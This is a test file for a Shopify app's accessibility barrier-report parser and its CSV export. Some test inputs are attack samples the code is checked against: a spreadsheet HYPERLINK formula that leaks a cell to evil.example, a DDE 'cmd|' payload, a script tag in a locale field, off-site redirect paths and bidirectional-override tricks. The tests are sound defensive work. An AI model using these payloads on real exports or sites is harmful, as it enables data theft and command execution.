// The barrier-report body rules the api must apply (ADR-162), as a reference the browser
// tests' fake app proxy also uses.
import { describe, expect, it } from 'vitest';
import {
  MAX_BODY_BYTES,
  MAX_DESCRIPTION_LENGTH,
  MAX_EMAIL_LENGTH,
  MAX_PAGE_LENGTH,
  MIN_ELAPSED_MS,
  MIN_PHONE_DIGITS,
  PAGE_TYPES,
  PUBLIC_PAGE_TYPES,
  exportCell,
  mentionsShopper,
  parseBarrierReport,
} from '../src/barrier-report.ts';

const cp = (...points: number[]): string => String.fromCodePoint(...points);

const form = (fields: Record<string, string>): string => new URLSearchParams(fields).toString();
const VALID = {
  description: '  The size picker cannot be reached with the keyboard.  ',
  email: 'shopper@example.com',
  page: '/products/blue-shirt',
  page_type: 'product',
  locale: 'en',
  website: '',
  elapsed_ms: '12000',
};

describe('parseBarrierReport', () => {
  it('accepts a complete report and keeps only the documented fields, trimmed', () => {
    expect(parseBarrierReport(form({ ...VALID, logged_in_customer_id: '42', extra: 'x' }))).toEqual(
      {
        kind: 'accepted',
        report: {
          description: 'The size picker cannot be reached with the keyboard.',
          email: 'shopper@example.com',
          page: '/products/blue-shirt',
          pageType: 'product',
          locale: 'en',
        },
      },
    );
  });

  it('accepts a report with only a description; email, page, page type and locale become null', () => {
    expect(parseBarrierReport(form({ description: 'Low contrast on prices' }))).toEqual({
      kind: 'accepted',
      report: {
        description: 'Low contrast on prices',
        email: null,
        page: null,
        pageType: null,
        locale: null,
      },
    });
  });

  it('reports a missing or blank description, a too-long description and a malformed email', () => {
    expect(parseBarrierReport(form({ ...VALID, description: ' \n\t ' }))).toEqual({
      kind: 'invalid',
      errors: [{ field: 'description', code: 'missing' }],
    });
    expect(
      parseBarrierReport(form({ ...VALID, description: 'x'.repeat(MAX_DESCRIPTION_LENGTH + 1) })),
    ).toEqual({ kind: 'invalid', errors: [{ field: 'description', code: 'too-long' }] });
    expect(parseBarrierReport(form({ ...VALID, description: '', email: 'not an email' }))).toEqual({
      kind: 'invalid',
      errors: [
        { field: 'description', code: 'missing' },
        { field: 'email', code: 'invalid' },
      ],
    });
  });

  it('counts the description limit in UTF-16 code units, as the browser maxlength does', () => {
    const emoji = '\u{1F600}'; // two code units
    expect(parseBarrierReport(form({ description: emoji.repeat(1000) })).kind).toBe('accepted');
    expect(parseBarrierReport(form({ description: `${emoji.repeat(1000)}x` })).kind).toBe(
      'invalid',
    );
  });

  it('accepts the email shapes the browser accepts and refuses the rest', () => {
    for (const ok of ['a@b', 'first.last+tag@sub.example.co', "o'brien@example.ie"]) {
      expect(parseBarrierReport(form({ description: 'x', email: ok })).kind).toBe('accepted');
    }
    for (const bad of [
      'a@',
      '@b.com',
      'a b@c.com',
      'a@b..com',
      'a@-b.com',
      `${'a'.repeat(MAX_EMAIL_LENGTH - 4)}@b.co`,
    ]) {
      expect(parseBarrierReport(form({ description: 'x', email: bad }))).toEqual({
        kind: 'invalid',
        errors: [{ field: 'email', code: 'invalid' }],
      });
    }
  });

  it('removes control characters other than line breaks and tabs, and normalises to NFC', () => {
    const result = parseBarrierReport(
      form({ description: 'Café menu\u0000\u0007\nline two\ttab' }),
    );
    expect(result).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ description: 'Café menu\nline two\ttab' }) as unknown,
    });
  });

  it('drops a page that is not a same-site path, and an unknown page type or locale', () => {
    for (const page of [
      'https://evil.example/x',
      '//evil.example/x',
      '/\\evil',
      'products',
      `/${'a'.repeat(MAX_PAGE_LENGTH)}`,
      '/a\u0000b',
      `/products/${cp(0x202e)}gnp.exe`,
      `/products/a${cp(0x200b)}b`,
      '/products/a b',
    ]) {
      const result = parseBarrierReport(form({ description: 'x', page_type: 'product', page }));
      expect(result).toEqual({
        kind: 'accepted',
        report: expect.objectContaining({ page: null }) as unknown,
      });
    }
    const result = parseBarrierReport(
      form({ description: 'x', page_type: 'admin', locale: 'en-US<script>' }),
    );
    expect(result).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ pageType: null, locale: null }) as unknown,
    });
    expect(parseBarrierReport(form({ description: 'x', locale: 'pt-BR' }))).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ locale: 'pt-BR' }) as unknown,
    });
  });

  it('keeps every page type Shopify documents, and a path at the length limit', () => {
    expect(PAGE_TYPES.size).toBe(22);
    for (const pageType of PAGE_TYPES) {
      expect(parseBarrierReport(form({ description: 'x', page_type: pageType }))).toEqual({
        kind: 'accepted',
        report: expect.objectContaining({ pageType }) as unknown,
      });
    }
    const page = `/${'a'.repeat(MAX_PAGE_LENGTH - 1)}`;
    expect(parseBarrierReport(form({ description: 'x', page_type: 'page', page }))).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ page }) as unknown,
    });
  });

  it('keeps the path only for public page types, never for account, gift card or password pages', () => {
    expect([...PAGE_TYPES].filter((t) => !PUBLIC_PAGE_TYPES.has(t)).sort()).toEqual([
      'captcha',
      'customers/account',
      'customers/activate_account',
      'customers/addresses',
      'customers/login',
      'customers/order',
      'customers/register',
      'customers/reset_password',
      'gift_card',
      'password',
    ]);
    for (const [pageType, page] of [
      ['customers/order', '/account/orders/1234567'],
      ['gift_card', '/gift_cards/56174706753/0011c591fc720d0a51b80cdb694f969e'],
    ] as const) {
      expect(parseBarrierReport(form({ description: 'x', page_type: pageType, page }))).toEqual({
        kind: 'accepted',
        report: expect.objectContaining({ pageType, page: null }) as unknown,
      });
    }
    expect(parseBarrierReport(form({ description: 'x', page: '/products/a' }))).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ pageType: null, page: null }) as unknown,
    });
  });

  it('normalises to NFC after removing characters, removes invisible ones and keeps joiners', () => {
    const decomposed = `e${cp(0x07)}${cp(0x301)} caf${cp(0x200b)}e${cp(0xfeff)}`;
    expect(parseBarrierReport(form({ description: decomposed }))).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ description: `${cp(0xe9)} cafe` }) as unknown,
    });
    const lines = `one${cp(0x2028)}two${cp(0x2029)}three`;
    expect(parseBarrierReport(form({ description: lines }))).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ description: 'one\ntwo\nthree' }) as unknown,
    });
    const persian = cp(0x645, 0x6cc, 0x200c, 0x62e, 0x648, 0x627, 0x647, 0x645);
    expect(parseBarrierReport(form({ description: persian }))).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ description: persian }) as unknown,
    });
  });

  it('uses the first value of a repeated field', () => {
    expect(parseBarrierReport('description=first&description=second')).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ description: 'first' }) as unknown,
    });
  });

  it('discards, without saying so, a filled honeypot or a form sent faster than a person can', () => {
    expect(parseBarrierReport(form({ ...VALID, website: 'https://spam.example' }))).toEqual({
      kind: 'discarded',
      reason: 'honeypot',
    });
    expect(parseBarrierReport(form({ ...VALID, elapsed_ms: String(MIN_ELAPSED_MS - 1) }))).toEqual({
      kind: 'discarded',
      reason: 'too-fast',
    });
    // Without JavaScript there is no elapsed_ms; the report is kept.
    const noScript = Object.fromEntries(Object.entries(VALID).filter(([k]) => k !== 'elapsed_ms'));
    expect(parseBarrierReport(form(noScript)).kind).toBe('accepted');
    // A malformed elapsed_ms is ignored rather than trusted.
    expect(parseBarrierReport(form({ ...VALID, elapsed_ms: '-1' })).kind).toBe('accepted');
  });

  it('removes bidirectional overrides that would make a report read differently', () => {
    const result = parseBarrierReport(form({ description: 'pay \u202Eredro\u202C now' }));
    expect(result).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ description: 'pay redro now' }) as unknown,
    });
  });

  it('fits a maximal report in a non-Latin script inside the body limit', () => {
    const body = form({
      ...VALID,
      description: '\u969c'.repeat(MAX_DESCRIPTION_LENGTH),
      page: `/${'%E9%9A%9C'.repeat(220)}`,
    });
    expect(parseBarrierReport(body).kind).toBe('accepted');
  });

  it('refuses a body over the size limit before parsing it', () => {
    const body = form({ description: 'x'.repeat(MAX_BODY_BYTES) });
    expect(parseBarrierReport(body)).toEqual({ kind: 'too-large' });
  });
});

describe('exportCell', () => {
  it('quotes every cell and doubles quotes', () => {
    expect(exportCell('Low contrast')).toBe('"Low contrast"');
    expect(exportCell('say "hi"')).toBe('"say ""hi"""');
    expect(exportCell(null)).toBe('""');
  });

  it('defuses anything a spreadsheet would run as a formula', () => {
    expect(exportCell('=HYPERLINK("https://evil.example/?"&A2,"x")')).toBe(
      `"'=HYPERLINK(""https://evil.example/?""&A2,""x"")"`,
    );
    const leads = ['=', '+', '-', '@', '\t', '\r', cp(0xff1d), cp(0xff0b), cp(0xff0d), cp(0xff20)];
    for (const lead of leads) {
      expect(exportCell(`${lead}cmd`)).toBe(`"'${lead}cmd"`);
    }
    expect(exportCell("=cmd|'/Ccalc'!A0@x.y")).toBe(`"'=cmd|'/Ccalc'!A0@x.y"`);
    expect(exportCell('a=b')).toBe('"a=b"');
  });
});

describe('more page and export rules', () => {
  it('drops paths on app proxies and paths disguised with invisible letters', () => {
    for (const page of [
      '/apps/other/session/abc',
      '/a/x',
      '/tools/x',
      '/community/y',
      `/products/a${cp(0x3164)}b`,
      `/products/a${cp(0xffa0)}b`,
      `/products/a${cp(0x61c)}b`,
    ]) {
      expect(parseBarrierReport(form({ description: 'x', page_type: 'page', page })), page).toEqual(
        {
          kind: 'accepted',
          report: expect.objectContaining({ page: null }) as unknown,
        },
      );
    }
    expect(
      parseBarrierReport(form({ description: 'x', page_type: 'page', page: '/apples' })),
    ).toEqual({
      kind: 'accepted',
      report: expect.objectContaining({ page: '/apples' }) as unknown,
    });
  });

  it('defuses a formula behind leading whitespace', () => {
    expect(exportCell(' =1+1')).toBe(`"' =1+1"`);
    expect(exportCell('\n@SUM(A1)')).toBe(`"'\n@SUM(A1)"`);
  });
});

describe('mentionsShopper', () => {
  it('finds the email as a literal, case-insensitive substring', () => {
    expect(
      mentionsShopper('Reach me at Ana.B@Example.com please', { email: 'ana.b@example.com' }),
    ).toBe(true);
    expect(mentionsShopper('Write to aXb@x.com', { email: 'a_b@x.com' })).toBe(false);
    expect(mentionsShopper('Write to a%b@x.com', { email: 'a_b@x.com' })).toBe(false);
    expect(mentionsShopper('nothing here', { email: '' })).toBe(false);
  });

  it('finds a phone number however it was typed, and ignores short numbers', () => {
    expect(mentionsShopper('Call (613) 555-0100 after 5', { phone: '+16135550100' })).toBe(true);
    expect(mentionsShopper('Call +1 613.555.0100', { phone: '6135550100' })).toBe(true);
    expect(mentionsShopper('Order 5550100 failed', { phone: '+16135550100' })).toBe(true);
    expect(mentionsShopper('Size 10 shoe, 2 pairs', { phone: '+16135550100' })).toBe(false);
    expect(MIN_PHONE_DIGITS).toBe(7);
    expect(mentionsShopper('Call 555-0100', { phone: '555' })).toBe(false);
    expect(mentionsShopper('Call 613 555 0199', { phone: '+16135550100' })).toBe(false);
  });
});
